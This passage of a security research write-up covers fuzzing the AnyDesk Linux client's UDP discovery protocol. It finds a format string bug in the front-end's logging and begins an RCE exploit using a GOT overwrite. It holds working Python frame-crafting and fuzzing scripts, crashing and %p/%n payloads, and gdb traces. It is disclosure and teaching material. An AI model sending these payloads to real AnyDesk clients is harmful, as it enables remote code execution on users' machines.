Accordingly the application is listening on TCP port `7070` and UDP port `50001`. By displaying all anydesk processes, we can see that the listening process is the service process itself (PID `598`). Also recognize the traybar process (PID `2983`) as well as the front-end process (PID `3421`):

```

user@w00d:~$ sudo ps aux | grep anydesk
root       598  0.0  0.3 531172 28620 ?        Ssl  08:56   0:02 /usr/bin/anydesk --service
user      2983  0.0  0.2 744288 23736 tty2     Sl+  08:58   0:00 /usr/bin/anydesk --tray
user      3421  0.0  0.4 864624 37760 tty2     Sl+  09:01   0:00 /usr/bin/anydesk

```

Before we can reasonably fuzz the application, we have to determine what data the application is usually expecting to receive on these ports. In order to get some sample data, we can inspect all traffic related to these ports using `wireshark` while interacting with the application.

According to the observations we can make with wireshark TCP port 7070 is used for the actual remote desktop connection and uses TLS to encrypt the traffic. The details are not relevant for our considerations here. The relevant port is UDP 50001, which is used to announce AnyDesk clients within a local network. On startup of AnyDesk we can see that our client sends UDP packets to `239.255.102.18` in order to announce its presence. The packet contains the hostname (`w00d`), the username (`scryh`), a profile picture as well as a few other information:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_01.png)

Assuming that these announcements are also processed by our own client, we now have some legitimate data in order to fuzz the application. At first I started by fuzzing the application using [fuzzotron](https://github.com/denandz/fuzzotron), which is written in C and is quite fast. fuzzotron uses [radamsa](https://gitlab.com/akihe/radamsa) and/or [blab](https://github.com/aoh/blab) for the mutation of the input data. The setup is straightforward. We simply put our initial data observed in wireshark in a test-case file and then run fuzzotron providing among others the IP address and port as well as the PID, which fuzzotron should monitor for possible crashes.

Unfortunately I could not find any flaws that seemed to be exploitable. So I decided to change the approach. Instead of directly targeting the service process, which is listening on the network socket, we can focus on the front-end process (PID `2983` in the output above). The front-end process is responsible for displaying the GUI to the user and communicates with the service process to exchange information relevant for the GUI. When the service process receives a valid UDP announcement frame this frame is passed to the front-end process in order to display the announced device within the GUI:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

To make our fuzzing input reach the front-end process we have to send valid announcement frames. The problem here is that most of the frames produced by the fuzzer we used so far are not valid, because there are mutated without any knowledge of the specific format of these frames. Accordingly most of the fuzzer-mutated frames are dropped by the service process and never reach the front-end process.

In order to create valid announcement frames we have to understand how the frames are built. Fortunately the format is not very complicated. By changing settings like our username or hostname and then observing the corresponding announcement frames our client is sending, we can derive how the frames are built. Among other things a frame contains the AnyDesk ID (4-byte), an operating system ID (1-byte) as well as the hostname and username, which are both transmitted as a 4-byte length field (`big-endian`) followed by the actual data. There are a few other fields and static values, which are not relevant for our considerations. The following python script creates a valid frame based on the given parameters and sends it to our local machine on UDP port 50001:

```

#!/usr/bin/env python

import struct
import socket

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

p = gen_discover_packet(4919, 1, 'custom host', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

After running the script we can see in the GUI that the front-end received the announcement and the fake device is displayed:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_03.png)

Now we are ready to explicitly fuzz certain fields of the frame. In order to do this we extend the python script to serve as our fuzzer. We can generate the actual fuzzing input by using radamsa again. Also we will monitor the front-end process and dump the last 10 fuzzing inputs, if the process died. The full fuzzer script, which targets the hostname, looks like this:

```

#!/usr/bin/env python

import struct
import socket
import subprocess
import psutil
import os
import time

ip = '127.0.0.1'
port = 50001
host_payloads = [''] * 10
dump_idx = 0

def mutate(pl):
  p = subprocess.Popen(['/usr/bin/radamsa', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  return p.communicate(pl)[0]

def isAlive():
  for p in psutil.process_iter():
    if (p.name() == 'anydesk' and len(p.cmdline()) == 1): return True
  return False

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

def dump():
  global dump_idx
  print('dumping '+str(dump_idx))
  os.system('mkdir loot'+str(dump_idx))
  for i in range(len(host_payloads)):
    f = open('./loot'+str(dump_idx)+'/host_payload'+str(i), 'wb')
    f.write(host_payloads[i])
    f.close()
  dump_idx += 1
  os.system('anydesk&')
  time.sleep(5)

idx = 0
while True:
  time.sleep(5.0)
  host = mutate('host')
  if (len(host) > 45000): continue # max length
  host_payloads[idx%len(host_payloads)] = host
  p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(p, (ip, port))
  s.close()
  idx += 1
  if (not isAlive()): dump()

```

The sleep time for each fuzzing iteration is quite high (5 seconds), but it turned out that the GUI is only updated every 5 seconds. At first I thought about patching the binary in order to increase the update interval, but before digging into this I decided to just let the fuzzer run over a night.

At the next day the fuzzing results were ready to be evaluated. The front-end actually crashed a few times and the script stored the fuzzing inputs on disk. At first we need to determine which exact payload triggered the crash. Since we saved the last 10 payloads sent to the application, we just need to resend these payloads and determine which one makes the application crash. This can be done using the following script:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  ...

host = open(sys.argv[1]).read()
p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

By sending the following payload the front-end crashes:

```

user@w00d:~$ ./resend.py loot2/host_payload4

... crash ...

user@w00d:~$ hexdump -C loot2/host_payload4
00000000  61 61 61 61 25 64 25 6e  25 70 25 64 24 2b f3 a0  |aaaa%d%n%p%d$+..|
00000010  81 9c 81 bd 0b 7c                                 |.....||
00000016

```

By fuzzing the AnyDesk front-end process with a python script, which produces valid announcement frames and mutates the hostname using radamsa, we successfully generated an input, which crashes the application. The next step is to analyze the bug in order the determine, if we can exploit it.

# Bug

So far we have fuzzed the AnyDesk front-end and identified an input which makes the front-end crash. The next step is to determine what the cause of this crash is and to examine if it is based on a bug which we can exploit.

At first we start up the front-end again and attach gdb to it (the `pid_frontend.py` script merely retrieves the current `PID` of the front-end process):

```

root@w00d:~# gdb /usr/bin/anydesk $(~/pid_frontend.py)

...
Reading symbols from /usr/bin/anydesk...(no debugging symbols found)...done.
Attaching to program: /usr/bin/anydesk, process 10911
[New LWP 10913]
[New LWP 10914]
[New LWP 10928]
[New LWP 10931]
[New LWP 10938]
[New LWP 10941]
[New LWP 10942]
[New LWP 10943]
[New LWP 10944]
[New LWP 10945]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffdfc
RBX: 0x1cf7720 --> 0x100000005
RCX: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
RDX: 0x37a0
RSI: 0x3
RDI: 0x1cf7720 --> 0x100000005
RBP: 0x3
RSP: 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
RIP: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
R8 : 0x0
R9 : 0x1ab6720 --> 0x1900000024
R10: 0x1ce3000 --> 0x1ab6720 --> 0x1900000024
R11: 0x293
R12: 0x37a0
R13: 0x37a0
R14: 0x7f491d0b9f70 (<g_poll>:	mov    esi,esi)
R15: 0x3
EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f491870ebef <__GI___poll+63>:	mov    rdi,rbx
   0x7f491870ebf2 <__GI___poll+66>:	mov    eax,0x7
   0x7f491870ebf7 <__GI___poll+71>:	syscall
=> 0x7f491870ebf9 <__GI___poll+73>:	cmp    rax,0xfffffffffffff000
   0x7f491870ebff <__GI___poll+79>:	ja     0x7f491870ec32 <__GI___poll+130>
   0x7f491870ec01 <__GI___poll+81>:	mov    edi,r8d
   0x7f491870ec04 <__GI___poll+84>:	mov    DWORD PTR [rsp+0xc],eax
   0x7f491870ec08 <__GI___poll+88>:	call   0x7f491872a740 <__libc_disable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
0008| 0x7ffe12cbcfb8 --> 0x1cf7720 --> 0x100000005
0016| 0x7ffe12cbcfc0 --> 0x1957be0 --> 0x0
0024| 0x7ffe12cbcfc8 --> 0x3
0032| 0x7ffe12cbcfd0 --> 0x1cf7720 --> 0x100000005
0040| 0x7ffe12cbcfd8 --> 0x7f491d0aa5c9 (mov    r13d,eax)
0048| 0x7ffe12cbcfe0 --> 0x0
0056| 0x7ffe12cbcfe8 --> 0x101957be0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f491870ebf9 in __GI___poll (fds=0x1cf7720, nfds=0x3, timeout=0x37a0) at ../sysdeps/unix/sysv/linux/poll.c:29
29	../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
gdb-peda$ c
Continuing.

```

Now we resend the payload, which caused the crash:

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

As expected the application raises a segmentation fault:

```

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7ffe12cbb800 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RCX: 0x0
RDX: 0x7ffe12cbc4f8 --> 0x0
RSI: 0x7ffe12cbb568 --> 0xd24f18983b49a900
RDI: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
RBP: 0x7ffe12cbb5a0 --> 0x7ffe12cbbc00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177")
RSP: 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
RIP: 0x7f4918657932 (<_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x7ffe12cbb88c --> 0xf32b24642570256e
R12: 0x7ffe12cbc4c8 --> 0x3000000020 (' ')
R13: 0x91
R14: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
R15: 0x6e ('n')
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f4918657928 <_IO_vfprintf_internal+9624>:	add    eax,0x8
   0x7f491865792b <_IO_vfprintf_internal+9627>:	mov    DWORD PTR [r12],eax
   0x7f491865792f <_IO_vfprintf_internal+9631>:	mov    rax,QWORD PTR [rdx]
=> 0x7f4918657932 <_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d
   0x7f4918657935 <_IO_vfprintf_internal+9637>:	jmp    0x7f4918655930 <_IO_vfprintf_internal+1440>
   0x7f491865793a <_IO_vfprintf_internal+9642>:	mov    QWORD PTR [rbp-0x4e8],r11
   0x7f4918657941 <_IO_vfprintf_internal+9649>:	mov    QWORD PTR [rbp-0x4e0],rax
   0x7f4918657948 <_IO_vfprintf_internal+9656>:	call   0x7f4918684150 <_IO_vtable_check>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
0008| 0x7ffe12cbb038 --> 0x0
0016| 0x7ffe12cbb040 --> 0x7ffe12cbb88a ("d%n%p%d$+\201\275\v|'")
0024| 0x7ffe12cbb048 --> 0x7ffe00000000
0032| 0x7ffe12cbb050 --> 0x0
0040| 0x7ffe12cbb058 --> 0x1
0048| 0x7ffe12cbb060 --> 0xffffffffffffffff
0056| 0x7ffe12cbb068 --> 0x100000000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
1642	vfprintf.c: No such file or directory.

```

As we can see, the crash is caused by the instruction `mov DWORD PTR [rax], r13d` within the function `_IO_vfprintf_internal`. Since the value of `rax` is `0` a segmentation fault is raised. Using the command `bt` we can print the stacktrace:

```

gdb-peda$ bt
#0  0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
#1  0x00007f4918682910 in _IO_vsnprintf (
    string=0x7ffe12cbbc00 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177", maxlen=<optimized out>,
    format=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", args=0x7ffe12cbc4c8) at vsnprintf.c:114
#2  0x00000000008ab34b in ?? ()
#3  0x00000000008aba98 in ?? ()
#4  0x0000000000434395 in ?? ()
#5  0x00007f491d0b11cd in g_logv () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  0x00007f491d0b133f in g_log () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
...

```

According to the output the return address after the `vsnprintf` call is `0x8ab34b` (`#2`). Let’s examine the code at this address in `ghidra`:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_04.png)

The call to `vsnprintf` is at `0x8ab346`. The third parameter of the function is the format string to be used (`local_cb8`). A few lines before we can see that the fourth parameter of the outer function (`param_4`) is copied into `local_cb8` using `strncpy`. In order to determine which parameters were passed to `vsnprintf` let’s set a breakpoint on the call and resend the payload:

```

gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffec15e4248 --> 0x3000000010
RDX: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RSI: 0x400
RDI: 0x7ffec15e3980 --> 0x7
RBP: 0x5
RSP: 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa0
R11: 0x7fb9b72f9550 --> 0xfff08320fff08310
R12: 0x7ffec15e4248 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x2475ec0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffec15e3980 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
arg[3]: 0x7ffec15e4248 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
0008| 0x7ffec15e34a8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0016| 0x7ffec15e34b0 --> 0x25ed450 --> 0x0
0024| 0x7ffec15e34b8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0032| 0x7ffec15e34c0 --> 0x7ffec15e3820 --> 0x0
0040| 0x7ffec15e34c8 --> 0x7fb9bbbe89d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffec15e34d0 --> 0x23e8230 --> 0x2253ab0 --> 0x2244340 --> 0x31 ('1')
0056| 0x7ffec15e34d8 --> 0x2622e60 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()

```

We hit the breakpoint on the call to `vsnprintf`. The third parameter (`RDX`) contains the format string. The passed string obviously contains an error message about an invalid UTF-8 encoded text. But this string does also contain the string, which caused the error: `'aaaa%d%n%p%d$+\201\275\v|'`. This is our fuzzing input! In the format string! We have found a format string vulnerability.

In this case the actual crash of the application was caused by the `%n` format specifier within the fuzzer-generated data. The `%n` format specifier can be used to write data. The address, where the data in this case is supposed to be written, happened to be null. This caused the segmentation fault.

Analyzing the code a little bit further we can determine that the call to `vsnprintf` prepares a string, which will be written to the log file (`~/.anydesk/anydesk.trace`). The fourth parameter of the outer function, which will be used as the format string, is in this case an error message generated by the `glib` library, which is raised because the text contains an invalid UTF-8 sequence. This error message was obviously assumed to be static. However the error message contains the input, which caused the error (the fuzzed hostname), which we can control. Thus we can control parts of the format string by inserting an invalid UTF-8 sequence into the hostname of an announcement frame. This results in a classical format string vulnerability.

Also it turned out that the vulnerable call is actually made twice. By sending an announcement frame with an invalid UTF-8 sequence and a format specifier (`'\x85\xfeTEST %p'`), we can see the result in `~/.anydesk/anydesk.trace`:

```

user@w00d:~$ tail -n 3 ~/.anydesk/anydesk.trace
warning 2020-05-25 08:59:02.119   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
warning 2020-05-25 08:59:02.125   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
   info 2020-05-25 08:59:02.132   frontend   main   4431   4431                     unix_app.frontend - Monitoring online states.

```

The error message has been written twice to the log file. We can also see how the inserted format specifier (`%p`) has been evaluated.

After analyzing the segmentation fault discovered by fuzzing the front-end process, we identified that the cause of the crash is a format string vulnerability. The next step is to develop an exploit for the identified vulnerability.

# Exploit

Within my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B) I described the basics on how to exploit a format string vulnerability using the `%n` format specifier. This format specifier can be used to write data and also caused the segmentation fault when fuzzing the application. Within this section we will take a look at how to exploit the format string vulnerability in this very specific setting in order to gain Remote Code Execution (RCE).

## Strategy

Probably the very first thing everyone does when facing a binary exploitation challenge is to check which security mechanisms are enabled. In this case the result is very surprising:

```

user@w00d:~$ checksec /usr/bin/anydesk
[*] '/usr/bin/anydesk'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

Actually no protection mechanisms are enabled, which makes the exploitation more easy.

While developing an exploit I would generally suggest to disable ASLR and just keep in mind that we have to bypass it. This makes it easier to compare addresses of multiple runs of the application:

```

user@w00d:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0

```

The first goal we need to achieve is to control the instruction pointer. Since there is `No RELRO`, we can use the `%n` format specifier to overwrite an entry within the `Global Offset Table` (`GOT`). As the heap segment, where our input data will be stored, is actually executable, we can store a shellcode there and make the `GOT` entry point to this shellcode. On the next call of the function, which `GOT` entry we overwrote, our shellcode is executed.

Although these steps sound quite straight forward, achieving this turned out to be a little bit more challenging. Let’s have a look.

## The v in vsnprintf

The next instruction after the vulnerable call to `vsnprintf` is a call to the function `time`. Accordingly we can overwrite the `GOT` entry of `time` and thus redirecting the control flow immediately after the `vsnprintf` call. In order to use the `%n` format specifier to overwrite the `GOT` entry of `time`, we need to be able to reference the address of the `GOT` entry. In a classical format string exploit this is achieved by being able to control data on the stack. Since all values on the stack, which are equal or below to the current `RSP`, can be referenced with an appropriate argument selector (e.g. `%35$n`), the desired address can simply be put into the controlled stack data. Using the appropriate argument selector in combination with the `%n` format specifier causes the function to write the amount of characters written so far to this address.

In this case things are a little bit different. As you probably already noticed the vulnerable call is **not** made to the function `snprintf`, which signature looks like this:

```

snprintf(char *s, size_t n, const char *format, ...)

```

…, but rather `vsnprintf`, which signature looks like this:

```

vsnprintf(char *s, size_t n, const char *format, va_list arg)

```

The difference here is that the format string arguments are not directly passed as variable arguments (`...`), but within a `va_list` parameter (`arg`). Each of the functions in the printf family has a corresponding `va_list` function beginning with the letter `v`:

```

user@w00d:~$ man 3 printf
...

       #include <stdio.h>

       int printf(const char *format, ...);
       int fprintf(FILE *stream, const char *format, ...);
       int dprintf(int fd, const char *format, ...);
       int sprintf(char *str, const char *format, ...);
       int snprintf(char *str, size_t size, const char *format, ...);

       #include <stdarg.h>

       int vprintf(const char *format, va_list ap);
       int vfprintf(FILE *stream, const char *format, va_list ap);
       int vdprintf(int fd, const char *format, va_list ap);
       int vsprintf(char *str, const char *format, va_list ap);
       int vsnprintf(char *str, size_t size, const char *format, va_list ap);

```

The structure of `va_list` is actually specific to the `Application Binary Interface` (`ABI`), which e.g. describes the calling convention, how the stack is organized and so on. On `x86`, where all function parameters are passed on the stack, `va_list` simply consists of a pointer to the stack area, where the original parameters are stored. With `x64` things get a little bit more complex. The first six parameters are passed in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), also there are special registers for floating point parameters (`XMM0` … `XMM7`). Additional parameters are passed on the stack as with `x86`. There is a very good blog post describing the details, which can be found [here](https://blog.nelhage.com/2010/10/amd64-and-va_arg/). The structure of the `va_list` looks like this on `x64`:

```

typedef struct {
  unsigned int gp_offset;
  unsigned int fp_offset;
  void *overflow_arg_area;
  void *reg_save_area;
} va_list[1];

```

There are two pointers: `overflow_arg_area`, which points to the first argument originally passed on the stack and `reg_save_area`, which points to an area on the stack where the arguments passed via registers are saved (the first six general parameters as well as eight floating point parameters). Both values `gp_offset` and `fp_offset` are offsets relative to `reg_save_arena` and reference the first general register parameter (`gp_offset`) as well as the first floating point parameter (`fp_offset`). These offsets exists because there are usually other parameters before the variable parameters (e.g. the format string itself).

Let’s have a practical look at this on the AnyDesk front-end. We attach gdb to it and set a breakpoint on the call to `vsnprintf`:

```

user@w00d:~$ sudo gdb /usr/bin/anydesk $(~/pid_frontend.py)
...
Attaching to program: /usr/bin/anydesk, process 3863
...
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

Now we can use the python function again, which we created to generate announcement frames. In this case we send an announcement with the following hostname:

```

p = gen_discover_packet(4919, 1, '\x85\xfe 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

The beginning of the hostname (`'\x85\xfe'`) is an invalid UTF-8 sequence, which will trigger the format string vulnerability (any other invalid UTF-8 sequence can be used here). After this we use the `%p` format specifier to print the values of the first ten arguments.

A few seconds after running the script (up to 5 seconds until the GUI refreshes) our breakpoint is hit:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffff81
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453d80 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0016| 0x7ffffffeab00 --> 0x158cba0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138ca30 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1572280 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$

```

The fourth parameter (`RCX = 0x7ffffffeb898`) is the `va_list` structure. The first two unsigned ints (4 bytes each) are the members `gp_offset` and `fp_offset`:

```

gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030

```

After these values both pointers `overflow_arg_area` and `reg_save_area` follow:

```

gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0

```

Since the value of `gp_offset` is 0x10, the function which was originally called with variable arguments had two preceding general parameters. In order to display the next four general parameters assumed to be passed in the remaining registers, we need to add `gp_offset` (`0x10`) to the `reg_save_area` pointer (`0x00007ffffffeb8b0`):

```

gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001453d80	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

`vsnprintf` assumes that these four values were passed in registers. All following values are assumed to be passed via the stack and are referenced by the `overflow_arg_area` pointer (`0x00007ffffffeb970`):

```

gdb-peda$ x/6xg 0x00007ffffffeb970
0x7ffffffeb970:	0x0000000000b366d8	0x0000000000000000
0x7ffffffeb980:	0x0000000001482b01	0x00007ffff5e4ee24
0x7ffffffeb990:	0x0000000001453d80	0x0000000000000000

```

By entering `ni` the call to `vsnprintf` is made and we can inspect the resulting string (`set print elements 0` displays the whole string without truncation):

```

gdb-peda$ ni
...
gdb-peda$ set print elements 0
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.0x1453d80 2.(nil) 3.0x7ffff1784c40 4.0x10 5.0xb366d8 6.(nil) 7.0x1482b01 8.0x7ffff5e4ee24 9.0x1453d80 10.(nil)'"

```

The first four parameters were indeed taken from the `reg_save_area` and all following values from the `overflow_arg_arena`. The following picture summarizes the structure:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_05-1.png)

## Gaining arbitrary write

After we have clarified what we can access with the format string, we need to find some data that we can control in the accessible data. If we can directly control data within the `reg_save_area` or `overflow_arg_area`, we could store the address of the `time GOT` entry and write to it using the `%n` format specifier.

